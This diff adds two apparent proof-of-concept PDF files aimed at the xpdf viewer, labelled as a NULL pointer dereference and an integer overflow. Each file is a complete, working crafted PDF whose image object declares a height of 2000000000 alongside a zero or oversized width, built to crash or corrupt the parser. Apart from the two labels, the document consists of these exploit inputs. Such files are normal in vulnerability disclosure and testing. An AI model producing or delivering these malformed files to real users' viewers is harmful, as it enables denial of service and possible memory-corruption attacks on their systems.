@@ -1,0 +1,241 @@
+[1] - NULL pointer dereference:
+
+-------------- xpdf-poc-null-pointer-dereference.pdf -------------
+%PDF-1.3
+% 'BasicFonts': class PDFDictionary 
+1 0 obj
+% The standard fonts dictionary
+<< /F1 2 0 R >>
+endobj
+% 'F1': class PDFType1Font 
+2 0 obj
+% Font Helvetica
+<< /BaseFont /Helvetica
+ /Encoding /WinAnsiEncoding
+ /Name /F1
+ /Subtype /Type1
+ /Type /Font >>
+endobj
+% 'FormXob.322a89588a84510d9b1b6ec68c3b4437': class PDFImageXObject 
+3 0 obj
+<< /BitsPerComponent 8
+ /ColorSpace /DeviceRGB
+ /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Height 2000000000
+ /Length 61
+ /Subtype /Image
+ /Type /XObject
+ /Width 0 >>
+stream
+GarPPGWE%h$j7l8U/<b)7aWX$5Y7NE=r1HcE+b-(;)F/"d9oEm?)I\-b23C~>endstream
+
+endobj
+% 'Page1': class PDFPage 
+4 0 obj
+% Page dictionary
+<< /Contents 8 0 R
+ /MediaBox [ 0
+ 0
+ 595.2756
+ 841.8898 ]
+ /Parent 7 0 R
+ /Resources << /Font 1 0 R
+ /ProcSet [ /PDF
+ /Text
+ /ImageB
+ /ImageC
+ /ImageI ]
+ /XObject << /FormXob.322a89588a84510d9b1b6ec68c3b4437 3 0 R >> >>
+ /Rotate 0
+ /Trans <<  >>
+ /Type /Page >>
+endobj
+% 'R5': class PDFCatalog 
+5 0 obj
+% Document Root
+<< /Outlines 9 0 R
+ /PageMode /UseNone
+ /Pages 7 0 R
+ /Type /Catalog >>
+endobj
+% 'R6': class PDFInfo 
+6 0 obj
+<< /Author (anonymous)
+ /CreationDate (20090525000415)
+ /Keywords ()
+ /Producer (ReportLab http://www.reportlab.com)
+ /Subject (unspecified)
+ /Title (untitled) >>
+endobj
+% 'R7': class PDFPages 
+7 0 obj
+% page tree
+<< /Count 1
+ /Kids [ 4 0 R ]
+ /Type /Pages >>
+endobj
+% 'R8': class PDFStream 
+8 0 obj
+% page stream
+<< /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Length 137 >>
+stream
+Gap(;0b2&S&-VlomLT2HjNbIbQSsFp1e964 () g>'<K)ZW1TUhKc(%
+Rpp=t5hkIT:&HH9nYhU`6Inl-6"Js0J5ePfhLZm8G)YG;4cqkJ;Rf)cZMkCEB*ZoFeK5S8`19G:#!aWM18.~>endstream
+
+endobj
+% 'R9': class PDFOutlines 
+9 0 obj
+<< /Count 0
+ /Type /Outlines >>
+endobj
+xref
+0 10
+0000000000 65535 f
+0000000113 00000 n
+0000000209 00000 n
+0000000415 00000 n
+0000000710 00000 n
+0000001052 00000 n
+0000001186 00000 n
+0000001397 00000 n
+0000001502 00000 n
+0000001783 00000 n
+trailer
+<< /ID 
+ % ReportLab generated PDF document -- digest
+(http://www.reportlab.com) 
+ [(xZ\271\226b\372\015\305\017\211\022\241\262?\243\347) (xZ\271\226b
+\372\015\305\017\211\022\241\262?\243\347)] 
+
+ /Info 6 0 R
+ /Root 5 0 R
+ /Size 10 >>
+startxref
+1834
+%%EOF
+-------------- xpdf-poc-null-pointer-dereference.pdf -------------
+
+
+[2] - Integer overflow:
+
+-------------- xpdf-poc-integer-overflow.pdf -------------
+%PDF-1.3
+% 'BasicFonts': class PDFDictionary 
+1 0 obj
+% The standard fonts dictionary
+<< /F1 2 0 R >>
+endobj
+% 'F1': class PDFType1Font 
+2 0 obj
+% Font Helvetica
+<< /BaseFont /Helvetica
+ /Encoding /WinAnsiEncoding
+ /Name /F1
+ /Subtype /Type1
+ /Type /Font >>
+endobj
+% 'FormXob.322a89588a84510d9b1b6ec68c3b4437': class PDFImageXObject 
+3 0 obj
+<< /BitsPerComponent 8
+ /ColorSpace /DeviceRGB
+ /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Height 2000000000
+ /Length 61
+ /Subtype /Image
+ /Type /XObject
+ /Width 1102 >>
+stream
+GarPPGWE%h$j7l8U/<b)7aWX$5Y7NE=r1HcE+b-(;)F/"d9oEm?)I\-b23C~>endstream
+
+endobj
+% 'Page1': class PDFPage 
+4 0 obj
+% Page dictionary
+<< /Contents 8 0 R
+ /MediaBox [ 0
+ 0
+ 595.2756
+ 841.8898 ]
+ /Parent 7 0 R
+ /Resources << /Font 1 0 R
+ /ProcSet [ /PDF
+ /Text
+ /ImageB
+ /ImageC
+ /ImageI ]
+ /XObject << /FormXob.322a89588a84510d9b1b6ec68c3b4437 3 0 R >> >>
+ /Rotate 0
+ /Trans <<  >>
+ /Type /Page >>
+endobj
+% 'R5': class PDFCatalog 
+5 0 obj
+% Document Root
+<< /Outlines 9 0 R
+ /PageMode /UseNone
+ /Pages 7 0 R
+ /Type /Catalog >>
+endobj
+% 'R6': class PDFInfo 
+6 0 obj
+<< /Author (anonymous)
+ /CreationDate (20090525000415)
+ /Keywords ()
+ /Producer (ReportLab http://www.reportlab.com)
+ /Subject (unspecified)
+ /Title (untitled) >>
+endobj
+% 'R7': class PDFPages 
+7 0 obj
+% page tree
+<< /Count 1
+ /Kids [ 4 0 R ]
+ /Type /Pages >>
+endobj
+% 'R8': class PDFStream 
+8 0 obj
+% page stream
+<< /Filter [ /ASCII85Decode
+ /FlateDecode ]
+ /Length 137 >>
+stream
+Gap(;0b2&S&-VlomLT2HjNbIbQSsFp1e964 () g>'<K)ZW1TUhKc(%
+Rpp=t5hkIT:&HH9nYhU`6Inl-6"Js0J5ePfhLZm8G)YG;4cqkJ;Rf)cZMkCEB*ZoFeK5S8`19G:#!aWM18.~>endstream
+
+endobj
+% 'R9': class PDFOutlines 
+9 0 obj
+<< /Count 0
+ /Type /Outlines >>
+endobj
+xref
+0 10
+0000000000 65535 f
+0000000113 00000 n
+0000000209 00000 n
+0000000415 00000 n
+0000000710 00000 n
+0000001052 00000 n
+0000001186 00000 n
+0000001397 00000 n
+0000001502 00000 n
+0000001783 00000 n
+trailer
+<< /ID 
+ % ReportLab generated PDF document -- digest
+(http://www.reportlab.com) 
+ [(xZ\271\226b\372\015\305\017\211\022\241\262?\243\347) (xZ\271\226b
+\372\015\305\017\211\022\241\262?\243\347)] 
+
+ /Info 6 0 R
+ /Root 5 0 R
+ /Size 10 >>
+startxref
+1834
+%%EOF
+
+-------------- xpdf-poc-integer-overflow.pdf -------------
